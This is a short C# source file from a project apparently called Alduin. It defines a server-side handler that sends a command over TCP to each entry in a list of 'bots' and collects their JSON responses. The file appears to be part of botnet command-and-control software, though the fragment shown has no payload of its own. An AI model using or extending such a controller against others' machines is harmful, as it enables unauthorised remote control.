using Alduin.Server.Commands;
using Alduin.Shared.DTOs;
using Alduin.Server.Modules;
using System;
using System.Collections.Generic;
using Newtonsoft.Json;

namespace Alduin.Server.Handler
{
    public class CommandExecute 
    {
        public static CommandResponseModel[] TcpConnects(BotDTO[] botlist, string model)//Multi response
        {
            CommandResponseModel[] response = new CommandResponseModel[botlist.Length];
            for (var i = 0; i < botlist.Length; i++)
            {
                response[i] = JsonConvert.DeserializeAnonymousType(Connecter.CreateTcpSend(botlist[i].Domain, model), new CommandResponseModel());
            };
            return response;
        }
        public static string TcpConnects(BotDTO botlist, string model)//Solo response
        {
            string response = Connecter.CreateTcpSend(botlist.Domain, model);
            return response;
        }
    }
}
